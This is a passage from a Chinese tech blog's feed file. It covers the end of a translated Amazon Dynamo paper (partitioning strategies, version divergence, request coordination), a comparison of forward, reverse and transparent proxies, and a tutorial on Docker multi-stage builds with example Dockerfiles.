<code>N=3</code> 时这种策略的示意图。</p><p>这种策略的主要优点：</p><ol><li>将数据的 partition 和 placement 解耦</li><li>提供了在运行时更改 placement 方案的能力</li></ol><h4 id="Strategy-3-每个节点-Q-S-个-token-平均分散"><a href="#Strategy-3-每个节点-Q-S-个-token-平均分散" class="headerlink" title="Strategy 3: 每个节点 Q/S 个 token, 平均分散"></a>Strategy 3: 每个节点 <code>Q/S</code> 个 token, 平均分散</h4><p>和策略 2 类似，策略 3 也将哈希空间等分为 <code>Q</code> 个 partition，而且 placement 从 partition 解耦。不同的是，每个节点会分配 <code>Q/S</code> 个 token，其中 <code>S</code> 是系统中的节点 数量。</p><p>当一个节点离开时，它的 token 会随机地分配给其他节点，因此 <code>Q/S</code> 个 token 的特性 还是能成立。类似地，当一个节点加入系统时，它会从其他节点“偷”一些 token 过来，同 时保证 <code>Q/S</code> 特性仍然成立。</p><h4 id="几种策略的性能对比"><a href="#几种策略的性能对比" class="headerlink" title="几种策略的性能对比"></a>几种策略的性能对比</h4><p>对一套 <code>S=30</code>，<code>N=3</code> 的 Dynamo 测试了以上三种策略。需要说明的是，公平地比较这三 种策略的性能是很难做到的，因为它们有各自特殊的配置可以调优。例如，策略 1 的负载 分布特性取决于 token 的数量（例如 <code>T</code>），而策略 3 取决于 partition 的数量（例如 <code>Q</code>）。</p><p>一种比较公平的方式是：<strong>所有的策略都使用相同大小的空间存储成员信息时，测量它们的 负载分布倾斜度</strong>（skew in load distribution）。例如，策略 1 中每个节点需要为环上 的全部节点维护各自的 token 位置，而策略 3 中每个节点需要维护系统分配给每个节点的 partition 信息。</p><p>实验中我们将通过改变相关的参数（<code>T</code> 和 <code>Q</code>）来评估这三种策略。测试每个节点需要维 护的成员信息的大小（size）不同时，几种策略的<strong>负载均衡效率</strong>。其中负载均衡效率（ load balancing efficiency）的定义是：每个节点平均处理的请求数 <code>/</code> 负载最高的节点处 理的请求数。</p><p>结果如图 8 所示。</p><p><img src="https://cdn.bugwz.com/dynamo-figure-8.png" alt="图 8 三种策略的负载均衡效率对比，30 个几点，N=3，每个节点维护相同大小的元数据"></p><p>如图所示，<strong>策略 3 取得了最好的负载均衡性能，策略 2 最差</strong>。在某段较短的时期内， 策略 2 充当了将线上的一些 Dynamo 从策略 1 迁移到策略 3 的过渡策略。</p><p>和 策略 1 相比，策略 3 性能更好，而且减少了每个节点所需维护的成员信息的大小。</p><p><strong>虽然存储这些成员信息并不会占用太多存储，但是，节点通过 gossip 协议定期地将成员 信息发送给其他节点</strong>（gossip the membership information periodically），因此<strong>保 持这些信息越紧凑越好。</strong></p><p>此外，策略 3 部署更加方便，原因包括：</p><ol><li><strong>bootstrap 和恢复更快</strong>：因为 <strong>partition 范围是固定的</strong>，因此可以将其存放 到<strong>单独的文件</strong>，这样下次 relocation 的时候可以直接将<strong>整个文件</strong>发送给其他节点 （避免了为了定位特点的数据而进行的<strong>随机访问</strong>）。简化了 bootstrap 和恢复的过程</li><li><strong>易于存档</strong>：定期对数据集（dataset）进行存档是 Amazon 存储服务的硬性要求之一 。在策略 3 中，存档过程会变得更容易，因为 partition 文件可以单独存档。作为对 比，在策略 1 中，token 是随机选取的，存档的时候需要从所有节点分别获取它们存储 的 key 信息，通常非常低效，速度也很慢。</li></ol><p>策略 3 的不足：<strong>变更节点成员时，需要 coordination</strong>，以保持平均分配所需的前提特 性（preserve the properties required of the assignment）。</p><h3 id="6-3-版本分叉：什么时候？有多少？"><a href="#6-3-版本分叉：什么时候？有多少？" class="headerlink" title="6.3 版本分叉：什么时候？有多少？"></a>6.3 版本分叉：什么时候？有多少？</h3><p>我们已经提到过，Dynamo 是通过牺牲一些一致性（consistency）来换可用性（ availability）的。要准确地理解不同类型的一致性失败带来的影响需要考虑很多因素：故障时 常（outage length）、失败类型（type of failures）、组件可靠性、负载等等。 详细地展示这些数据超出了本文范围。但是，本节可以提供一个很好的总结指标：一份真实 的生产环境里<strong>应用看到的分叉版本数量</strong>（number of divergent versions seen by the application）。</p><p>有两种情况会出现数据版本的分叉：</p><ol><li>遇到节点失败、数据中心故障或网络分裂等故障场景</li><li>同一数据对象的大量并发写操作，不同节点都在 coordinating 写操作</li></ol><p>从使用性（usability）和效率的角度，最好在任何时间都保证分叉的版本数尽量小。</p><p>如果冲突的版本无法仅通过向量时钟做句法调和（syntactically reconcile），那就需要 将它们交给业务逻辑，执行语义调和（semantic reconciliation）。</p><blockquote><p>If the versions cannot be syntactically reconciled based on vector clocks alone, they have to be passed to the business logic for semantic reconciliation.</p></blockquote><p><strong>Semantic reconciliation 会给服务引入额外的负担</strong>，因此应当越少越好。</p><p>我们采集了 24 小时内返回到购物车应用的版本数量。结果显示在这段时间内，<code>99.94%</code> 的请求看到的都是一个版本（无冲突）；<code>0.00057%</code> 的请求看到能 2 个，<code>0.00047%</code> 能看 到 3 个，<code>0.00009%</code> 的能看到 4 个。这说明版本分叉的概率还是相当小的。</p><p>实验还显示，导致分叉版本数量增多的并不是故障，而是并发写数量的增加。并发写数据上 升通常都是 busy robots（自动化客户端程序）导致的，极少是人（的应用）导致的。由于 涉及商业机密，在此不再就这一问题进行更深入的讨论。</p><h3 id="6-4-客户端驱动或服务端驱动的-Coordination"><a href="#6-4-客户端驱动或服务端驱动的-Coordination" class="headerlink" title="6.4 客户端驱动或服务端驱动的 Coordination"></a>6.4 客户端驱动或服务端驱动的 Coordination</h3><p>第 5 节提到，Dynamo 有一个 request coordination 组件，利用状态机处理收到的请求。</p><h4 id="服务端驱动"><a href="#服务端驱动" class="headerlink" title="服务端驱动"></a>服务端驱动</h4><p>客户请求会通过负载均衡器均匀地分发给哈希环上的所有节点。每个节点都可以作为读请求 的 coordinator，而写操作的 coordinator 必须由 key 的 preference list 里面的节点 才能充当。有这种限制是因为，preference list 中的这些节点<strong>被赋予了额外的职责：创 建一个新的版本戳（version stamp），在因果关系上包含被它的写操作更新的版本</strong>。注 意，如果 Dynamo 的版本化方案使用的是物理时间戳（physical timestamps），那任何节 点都可以 coordinate 写操作。</p><h4 id="客户端驱动"><a href="#客户端驱动" class="headerlink" title="客户端驱动"></a>客户端驱动</h4><p>另一中 coordinate request 的方式是：<strong>将状态机前移到客户端</strong>（move the state machine to the client nodes）。在这种方式中，客户端应用使用库（library）在本地执 行请求 coordination。每个客户端定期地随机选择一个 Dynamo 节点，下载它的系统成员 状态（Dynamo membership state）的当前视图（current view）。有了这个信息，客户端 就可以知道任何 key 对应的 preference list 由哪些节点组成。</p><p>读请求可以在客户端节点（client node）coordinate，因此如果请求是被负载均衡器随机 分给一个 Dynamo 节点，那这种方式可以避免额外的网络转发跳数。写操作或者转发给 key 对应的 preference list 里面的一个节点，或者，如果使用的是基于时间戳的版本化方式 ，可以在本地 coordinate。</p><p>客户端驱动的一个重要<strong>优势</strong>是：不再需要一个负载均衡器才能均匀地分发客户负载。 在存储节点上近乎均匀分布的 key，暗含了（implicitly guaranteed）负载的均匀分布。</p><p>显然，这种方式的效率取决于客户端侧的成员信息的新鲜程度（how fresh the membership information）。当前，每个客户端会每隔 <code>10s</code> 随机地轮询（poll）一个 Dynamo 节点， 获取成员更新（membership updates）。这里选用 pull 而不是 push 模型是考虑前者在大 量客户端的情况下可扩展性更好，而且相比于客户端侧，只需在服务端侧维护很少的状态信 息。</p><p>然而，在最差的情况下，客户端的 membership 信息会有 <code>10s</code> 的脏数据。 因此，如果客户端检测到它的成员表（membership table）过期了（例如，当一些成员不可 达的时候），它会立即更新它的成员信息。</p><h4 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h4><p>表 2 显示了客户端驱动比服务端驱动的 coordination 的性能提升，测量时间为 24 个小时。</p><p><img src="https://cdn.bugwz.com/dynamo-table-2.png" alt="表 2 客户端驱动和服务端驱动的 coordination 性能对比"></p><p>从中可以看出，客户端驱动的方式比服务端方式 <code>P99.9</code> 减少了至少 <code>30ms</code>，平均值减少 了 <code>3ms~4ms</code>。</p><p>延迟降低是因为客户端驱动的方式没有了负载均衡器的开销，而且减少了可能的将请求转发 给一个随机节点的网络跳数。</p><p>另外从表中还可以看出，平均延迟远远小于 <code>P99.9</code>。这是因为 Dynamo 的存储引擎缓存（ storage engine caches）和写缓存（write buffer）命中率很高。</p><p>另外，由于负载均衡器和网络会给延迟引入额外的抖动性，因此 <code>P99.9</code> 的性能提升要比 均值更明显。</p><h3 id="6-5-平衡后台和前台任务"><a href="#6-5-平衡后台和前台任务" class="headerlink" title="6.5 平衡后台和前台任务"></a>6.5 平衡后台和前台任务</h3><p>每个节点除了执行正常的前台 <code>put</code>&#x2F;<code>get</code> 操作之外，还需要为副本同步和数据移交（ handoff）（由于 hinting 或添加&#x2F;删除节点）执行不同种类的后台任务。</p><p>在早期的生产系统中，这些后台任务触发了资源竞争问题，影响了常规的 <code>get</code>&#x2F;<code>put</code> 操 作性能。</p><p>因此，必须在保证常规的关键操作不受明显影响的情况下，才允许执行后台任务。为此，我 们将后台任务关联了一种<strong>许可控制机制</strong>（admission control mechanism）。每个后台 任务通过这个控制器<strong>申请资源（例如数据库）的运行时时间片</strong>（runtime slice），这 些资源是在所有后台任务之间共享的。对前台任务性能的监控会通过<strong>反馈机制</strong>改变后台 任务可以使用的时间片数量。</p><p>许可控制器（admission controller）在执行一个前台 <code>put</code>&#x2F;<code>get</code> 操作的时候，会持续 监控资源访问的状况。<strong>监控的指标</strong>包括磁盘操作延迟、锁竞争和事务超时导致的数据库 访问失败次数，以及请求队列的等待时间。这些信息用于判断在给定的时间窗口之内的延迟 （或失败）性能是否在可接受的范围内。例如，后台控制器检查数据库（过去 <code>60s</code>）的 <code>P99</code> 读延迟是否离预设的阈值（例如 <code>50ms</code>）足够近。控制器正是根据这些对比信息为 前台操作评估资源的可用性，然后决定给后台任务分配多少时间片，因此利用反馈回路限制 了后台任务的侵入性（intrusiveness ）。[4] 也研究了类似的后台任务管理问题。</p><h3 id="6-6-讨论"><a href="#6-6-讨论" class="headerlink" title="6.6 讨论"></a>6.6 讨论</h3><p>本节总结我们在开发和维护 Dynamo 的过程中获得的一些经验。</p><p>很多 Amazon 的内部服务在过去的两年都开始使用 Dynamo，它给应用提供了非常高等级（ significant levels）的可用性。具体来说，使用 Dynamo 的应用，响应成功率（不包括超 时？）达到了 <code>99.9995%</code>（<strong>applications have received successful responses (without timing out) for 99.9995% of its requests</strong>），并且到目前位置还没有发 生过丢失数据的情况。</p><p>Dynamo 的主要优势是：给应用提供了配置能力，应用可以根据自己的需求对 <code>(N,R,W)</code> 进 行调优。</p><p>和流行的商业数据仓库不同，Dynamo 将数据一致性和 reconciliation 逻辑开放给了开发 者。刚开始时，有人可能会觉得这样会使应用逻辑变得更复杂。但从传统来看（ historically），Amazon 平台就是为高可用设计的，很多<strong>应用在设计的时候就考虑了如 何处理可能出现的各种故障模式（failure modes）和不一致问题</strong>。对于这类应用来说， 适配 Dynamo 相对还是比较简单的。对于想要使用 Dynamo 的新应用，就需要首先花一些时 间做一些分析，在开发初期，选择满足业务需求的合适的冲突解决机制（conflict resolution mechanisms）。</p><p>最后，Dynamo 采用了一种<strong>full membership model</strong>（完整成员模型），在这种模型中， 每个节点都知道它的对端（peer）节点存储哪些数据。在实现中，每个节点要主动将完整路 由表 gossip 给系统内的其他节点。这个模型<strong>对几百台、上千台节点的规模很适用</strong>。但 对于上万台节点的规模就不适应了，因为维护这么大一个系统的路由表开销会大大增加。 但是，可以通过向 Dynamo 引入<strong>hierarchical extensions</strong>（层级扩展）来解决这个限制。 <code>O(1)</code> 复杂度的的动态哈希树系统（DHS）（例如 [14]）解决的就是这种问题。</p><blockquote><p>this problem is actively addressed by O(1) DHT systems(e.g., [14]).</p></blockquote><h2 id="7-结束语"><a href="#7-结束语" class="headerlink" title="7. 结束语"></a>7. 结束语</h2><p>本文介绍了 Dynamo，一个高可用、高可扩展的数据仓库（data store），在 Amazon 电商 平台用于存储许多核心服务的状态数据。</p><p>Dynamo 提供了期望的可用性和性能等级，可以正确地处理服务器故障、数据中心故障和网 络分裂。</p><p>Dynamo 可以增量扩展，允许服务所有者根据负载高低动态的对 Dynamo 系统进行扩缩容； 允许服务所有者根据他们的性能、持久性和一致性 SLA 需求，通过调优 <code>N``R``W</code> 三个参 数来定制化它们的存储系统。</p><p>过去几年 Dynamo 在生产环境的实践表明：一些去中心化技术结合起来，可以提供一个高度 可用的系统。这种在极具挑战性的应用环境的成功也表明，<strong>最终一致性存储系统可以作为 高可用应用（highly available applications）的一块基石</strong>。</p><blockquote><p>The production use of Dynamo for the past year demonstrates that decentralized techniques can be combined to provide a single highly-available system. Its success in one of the most challenging application environments shows that an eventualconsistent storage system can be a building block for highlyavailable applications.</p></blockquote><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>The authors would like to thank Pat Helland for his contribution to the initial design of Dynamo. We would also like to thank Marvin Theimer and Robert van Renesse for their comments. Finally, we would like to thank our shepherd, Jeff Mogul, for his detailed comments and inputs while preparing the camera ready version that vastly improved the quality of the paper.</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ol><li>Adya, et al. Farsite: federated, available, and reliable storage for an incompletely trusted environment. SIGOPS 2002</li><li>Bernstein, P.A., et al. An algorithm for concurrency control and recovery in replicated distributed databases. ACM Trans. on Database Systems, 1984</li><li>Chang, et al. <strong>Bigtable: a distributed storage system for structured data</strong>. In Proceedings of the 7th Conference on USENIX Symposium on Operating Systems Design and Implementation, 2006</li><li>Douceur, et al. Process-based regulation of low-importance processes. SIGOPS 2000</li><li>Fox, et al. Cluster-based scalable network services. SOSP, 1997</li><li>Ghemawat, et al. <strong>The Google file system</strong>. SOSP, 2003</li><li>Gray, et al. The dangers of replication and a solution. SIGMOD 1996</li><li>Gupta, et al. On scalable and efficient distributed failure detectors. In Proceedings of the Twentieth Annual ACM Symposium on Principles of Distributed Computing. 2001</li><li>Kubiatowicz, et al. OceanStore: an architecture for global-scale persistent storage. SIGARCH Comput. Archit. News, 2000</li><li>Karger, et al. Consistent hashing and random trees: distributed caching protocols for relieving hot spots on the World Wide Web. STOC 1997</li><li>Lindsay, et al. “Notes on Distributed Databases”, Research Report RJ2571(33471), IBM Research, 1979</li><li>Lamport, L. <strong>Time, clocks, and the ordering of events in a distributed system</strong>. ACM Communications, 1978</li><li>Merkle, R. A digital signature based on a conventional encryption function. Proceedings of CRYPTO, 1988</li><li>Ramasubramanian, et al. Beehive: O(1)lookup performance for power-law query distributions in peer-topeer overlays. In Proceedings of the 1st Conference on Symposium on Networked Systems Design and Implementation, , 2004</li><li>Reiher, et al. Resolving file conflicts in the Ficus file system. In Proceedings of the USENIX Summer 1994 Technical Conference, 1994</li><li>Rowstron, et al. Pastry: Scalable, decentralized object location and routing for large-scale peerto- peer systems. Proceedings of Middleware, 2001.</li><li>Rowstron, et al. Storage management and caching in PAST, a large-scale, persistent peer-to-peer storage utility. Proceedings of Symposium on Operating Systems Principles, 2001</li><li>Saito, et al. FAB: building distributed enterprise disk arrays from commodity components. SIGOPS 2004</li><li>Satyanarayanan, et al. Coda: A Resilient Distributed File System. IEEE Workshop on Workstation Operating Systems, 1987.</li><li>Stoica, et al. Chord: A scalable peer-to-peer lookup service for internet applications. SIGCOMM 2001</li><li>Terry, et al. Managing update conflicts in Bayou, a weakly connected replicated storage system. SOSP 1995</li><li>Thomas. A majority consensus approach to concurrency control for multiple copy databases. ACM Transactions on Database Systems, 1979.</li><li>Weatherspoon, et al. Antiquity: exploiting a secure log for wide-area distributed storage. SIGOPS 2007</li><li>Welsh, et al. SEDA: an architecture for well-conditioned, scalable internet services. SOSP 2001</li></ol><p>本文转自：<a href="https://arthurchiao.github.io/blog/amazon-dynamo-zh/">https://arthurchiao.github.io/blog/amazon-dynamo-zh/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Paper </tag>
            
            <tag> NoSQL </tag>
            
            <tag> Distributed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正向/反向/透明代理服务器对比</title>
      <link href="/2019/10/12/proxy/"/>
      <url>/2019/10/12/proxy/</url>
      
        <content type="html"><![CDATA[<h2 id="一、正向代理"><a href="#一、正向代理" class="headerlink" title="一、正向代理"></a>一、正向代理</h2><p>正向代理是一个位于客户端和目标服务器之间的服务器，为了从目标服务器取得内容，客户端需要向代理服务器发送一个请求并指定目标服务器，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端。</p><p><img src="https://cdn.bugwz.com/proxy-forward.png" alt="正向代理"></p><h3 id="1-1、特点"><a href="#1-1、特点" class="headerlink" title="1.1、特点"></a>1.1、特点</h3><ul><li>用户无法直接访问目标服务器；</li><li>客户端明确知道自己访问的是代理服务器；</li><li>隐藏真实的客户端IP；</li></ul><h3 id="1-2、使用场景"><a href="#1-2、使用场景" class="headerlink" title="1.2、使用场景"></a>1.2、使用场景</h3><ul><li>为防火墙（局域网）内的客户端提供访问互联网的途径；</li><li>客户端的鉴权；</li><li>提供数据缓存，访问加速服务；</li></ul><h3 id="1-3、相关软件"><a href="#1-3、相关软件" class="headerlink" title="1.3、相关软件"></a>1.3、相关软件</h3><ul><li><p>Nginx</p></li><li><p>Apache Traffic Server</p></li><li><p>Tinyproxy</p></li><li><p>Squid Cache</p></li></ul><h2 id="二、反向代理"><a href="#二、反向代理" class="headerlink" title="二、反向代理"></a>二、反向代理</h2><p>反向代理服务器位于客户端与目标服务器之间，但是对于客户端而言，反向代理服务器就相当于目标服务器，即客户端直接访问反向代理服务器就可以获得目标服务器的资源。同时，客户端不需要知道目标服务器的地址，也无须在客户端作任何设定。</p><p><img src="https://cdn.bugwz.com/proxy-reverse.png" alt="反向代理"></p><h3 id="2-1、特点"><a href="#2-1、特点" class="headerlink" title="2.1、特点"></a>2.1、特点</h3><ul><li>客户端不知道访问的是代理服务器，客户端认为访问的就是实际的目标服务器；</li><li>目标服务器不知道访问请求来源于代理服务器。目标服务器认为发送请求的就是普通的客户端；</li></ul><h3 id="2-2、使用场景"><a href="#2-2、使用场景" class="headerlink" title="2.2、使用场景"></a>2.2、使用场景</h3><ul><li>网络的负载均衡；</li><li>保护和隐藏目标服务器；</li></ul><h3 id="2-3、相关软件"><a href="#2-3、相关软件" class="headerlink" title="2.3、相关软件"></a>2.3、相关软件</h3><ul><li>Nginx</li><li>Apache HTTP Server</li><li>IIS</li><li>Traffic Server</li><li>HAProxy</li><li>Squid</li></ul><h2 id="三、透明代理"><a href="#三、透明代理" class="headerlink" title="三、透明代理"></a>三、透明代理</h2><p>客户端根本不知道有代理服务器的存在，它改变客户端&#x2F;目标服务器的报文信息，并会传送真实IP。</p><p><img src="https://cdn.bugwz.com/proxy-transparent.png" alt="透明代理"></p><h3 id="3-1、特点"><a href="#3-1、特点" class="headerlink" title="3.1、特点"></a>3.1、特点</h3><ul><li>客户端不知道代理服务的存在；</li></ul><h3 id="3-2、使用场景"><a href="#3-2、使用场景" class="headerlink" title="3.2、使用场景"></a>3.2、使用场景</h3><ul><li>路由器的NAT转发；</li></ul><h3 id="3-3、相关软件"><a href="#3-3、相关软件" class="headerlink" title="3.3、相关软件"></a>3.3、相关软件</h3><ul><li><p>Squid</p></li><li><p>Polipo</p></li><li><p>Tinyproxy</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker多阶段构建的理解与使用</title>
      <link href="/2019/10/11/docker-multi-stage-builds/"/>
      <url>/2019/10/11/docker-multi-stage-builds/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>在构建镜像的过程中可能会区分为编译镜像以及运行镜像，我们在编译环境中进行二进制运行文件的构建编译工作，然后将运行文件放置在运行环境中构建体积较小的运行镜像，在这个过程中，我们可能会使用到多阶段构。</p><p>在<code>Docker</code>的<code>17.05</code>及更高的版本中支持了多阶段构建的方式，多阶段构建的方式极大的减小了需要阶段性构建的复杂度。<a href="https://docs.docker.com/develop/develop-images/multistage-build/">官方介绍 - multistage-build</a></p><h2 id="二、多阶段构建的前后对比"><a href="#二、多阶段构建的前后对比" class="headerlink" title="二、多阶段构建的前后对比"></a>二、多阶段构建的前后对比</h2><h3 id="2-1、使用多阶段构建之前"><a href="#2-1、使用多阶段构建之前" class="headerlink" title="2.1、使用多阶段构建之前"></a>2.1、使用多阶段构建之前</h3><p>构建Docker镜像的过程中，最具挑战性的事情就是如何保证Docker镜像的尺寸能够尽可能的小。但是在编译的过程中，我们可能会产生一些多余的中间件，但是很多情况下我们可能只需要最终的可运行的二进制文件，并不需要编译环境中的多余组件。</p><p>实际上，通常只有一个<code>Dockerfile</code>用于开发（包含构建应用程序所需的一切），而精简的<code>Dockerfile</code>用于生产时，它仅包含您的应用程序以及运行它所需的内容。这被称为“构建者模式”。维护两个<code>Dockerfile</code>是不理想的，并且也会十分复杂。</p><ul><li><code>Dockerfile.build</code>：用于开发构建的<code>Dockerfile</code>；</li><li><code>Dockerfile</code>：用于生产环境的<code>Dockerfile</code>；</li><li><code>build.sh</code>：构建第一个镜像并从中创建一个容器以复制出最终的二进制运行文件，然后构建第二个镜像；</li></ul><h4 id="2-1-1、Dockerfile-build"><a href="#2-1-1、Dockerfile-build" class="headerlink" title="2.1.1、Dockerfile.build"></a>2.1.1、Dockerfile.build</h4><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.7</span>.<span class="number">3</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /go/src/github.com/alexellis/href-counter/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.go .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go get -d -v golang.org/x/net/html \</span></span><br><span class="line"><span class="language-bash">  &amp;&amp; CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .</span></span><br></pre></td></tr></table></figure><h4 id="2-1-2、Dockerfile"><a href="#2-1-2、Dockerfile" class="headerlink" title="2.1.2、Dockerfile"></a>2.1.2、Dockerfile</h4><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine:latest  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk --no-cache add ca-certificates</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app .</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;./app&quot;</span>]</span></span><br></pre></td></tr></table></figure><h4 id="2-1-3、build-sh"><a href="#2-1-3、build-sh" class="headerlink" title="2.1.3、build.sh"></a>2.1.3、build.sh</h4><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">echo Building alexellis2/href-counter:build</span><br><span class="line"></span><br><span class="line">docker build --build-<span class="keyword">arg</span> https_proxy=$https_proxy --build-<span class="keyword">arg</span> http_proxy=$http_proxy \  </span><br><span class="line">    -t alexellis2/href-counter:build . -f Dockerfile.build</span><br><span class="line"></span><br><span class="line">docker container create --name extract alexellis2/href-counter:build  </span><br><span class="line">docker container cp extract:/go/src/github.com/alexellis/href-counter/app ./app  </span><br><span class="line">docker container rm -f extract</span><br><span class="line"></span><br><span class="line">echo Building alexellis2/href-counter:latest</span><br><span class="line"></span><br><span class="line">docker build --no-cache -t alexellis2/href-counter:latest .</span><br><span class="line">rm ./app</span><br></pre></td></tr></table></figure><h3 id="2-2、使用多阶段构建"><a href="#2-2、使用多阶段构建" class="headerlink" title="2.2、使用多阶段构建"></a>2.2、使用多阶段构建</h3><p>极大的降低了复杂度，第二<code>FROM</code>条指令以<code>alpine:latest</code>图像为基础开始新的构建阶段。该<code>COPY --from=0</code>行仅将先前阶段中构建产生的文件复制到当前的构建阶段中，Go相关的SDK和任何中间工件都没有保存在最终景象中;</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.7</span>.<span class="number">3</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /go/src/github.com/alexellis/href-counter/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go get -d -v golang.org/x/net/html  </span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.go .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> alpine:latest</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk --no-cache add ca-certificates</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=0 /go/src/github.com/alexellis/href-counter/app .</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;./app&quot;</span>]</span></span><br></pre></td></tr></table></figure><h2 id="三、多阶段构建的使用姿势"><a href="#三、多阶段构建的使用姿势" class="headerlink" title="三、多阶段构建的使用姿势"></a>三、多阶段构建的使用姿势</h2><h3 id="3-1、阶段的命名"><a href="#3-1、阶段的命名" class="headerlink" title="3.1、阶段的命名"></a>3.1、阶段的命名</h3><ul><li><code>整数编号</code>：默认情况下，构建阶段未命名，但是我们可以使用整数编号来进行引用，起始编号为<code>0</code>；</li><li><code>AS &lt;NAME&gt;</code>命名：在使用<code>FROM</code>指令中同时使用<code>AS [NAME] </code>来进行阶段的命名操作；</li></ul><h3 id="3-2、特定的构建阶段停止"><a href="#3-2、特定的构建阶段停止" class="headerlink" title="3.2、特定的构建阶段停止"></a>3.2、特定的构建阶段停止</h3><p>示例Dockerfile：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.7</span>.<span class="number">3</span> AS builder</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /go/src/github.com/alexellis/href-counter/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go get -d -v golang.org/x/net/html  </span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.go    .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> alpine:latest  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk --no-cache add ca-certificates</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /go/src/github.com/alexellis/href-counter/app .</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;./app&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>构建镜像时，不一定需要构建包括每个阶段的整个Dockerfile。您可以指定目标构建阶段，以下命令含义为<code>builder</code>的阶段构建停止：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build --target builder -t alexellis2/href-counter:latest .</span><br></pre></td></tr></table></figure><h3 id="3-3、将外部镜像作为阶段使用"><a href="#3-3、将外部镜像作为阶段使用" class="headerlink" title="3.3、将外部镜像作为阶段使用"></a>3.3、将外部镜像作为阶段使用</h3><p>使用多阶段构建时，您不仅限于从之前在<code>Dockerfile</code>中创建的阶段进行复制。您可以使用<code>COPY --from</code>指令从单独的映像进行复制，方法是使用本地映像名称，本地或<code>Docker</code>注册表上可用的标签或标签ID。Docker客户端在必要时提取映像并从那里复制工件。语法为：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf</span></span><br></pre></td></tr></table></figure><h2 id="四、多阶段构建的理解"><a href="#四、多阶段构建的理解" class="headerlink" title="四、多阶段构建的理解"></a>四、多阶段构建的理解</h2><h3 id="4-1、docker的层级概念"><a href="#4-1、docker的层级概念" class="headerlink" title="4.1、docker的层级概念"></a>4.1、docker的层级概念</h3><ul><li><code>文件层级</code>：<code>Docker</code>镜像可以理解为由多层的文件构成，当进行镜像的构建过程中，每执行一次<code>RUN</code>指令，镜像中就会增加一层；</li><li><code>起始层（根镜像）</code>：构建镜像的时候需要使用<code>FROM</code>指令选择一个基础镜像，即根镜像，后续所有的操作都会基于这个根镜像进行，<code>Docker</code>镜像只允许有一个根镜像，在多阶段构建中虽然使用了多个<code>FROM</code>指令，但是只有最后一个才是最终构建的根镜像；</li><li><code>层共享</code>：当我们的操作系统中只存在一个镜像，且该镜像的层数为<code>5</code>，当我们基于这个镜像构建新的镜像（新镜像比之前的镜像多出<code>2层</code>）进行构建的时候，最终在系统一共保存了<code>7层</code>，而不是<code>5+7=12层</code>，这就是<code>Docker</code>镜像的层共享；</li><li><code>联合挂载</code>：由于<code>Docker</code>的每一层只记录文件变更，因此在新启动一个容器的时候会计算当时使用镜像的每一层的信息，最终生成一个文件系统，这就是联合挂载的含义；</li></ul><h3 id="4-2、多个FROM的理解"><a href="#4-2、多个FROM的理解" class="headerlink" title="4.2、多个FROM的理解"></a>4.2、多个FROM的理解</h3><ul><li><p><code>中间产物</code>：在执行多个<code>FROM</code>之后，系统内会存在多个没有名称和<code>TAG</code>的无名镜像，这些镜像就是在多阶段构建中产生的中间镜像；</p></li><li><p><code>最终依赖</code>：多阶段构建中的多个<code>FROM</code>中只有最后一个<code>FROM</code>的镜像才是最终镜像的根镜像，在构建才是最终构建的根镜像；</p></li></ul>]]></content>
      
      
      
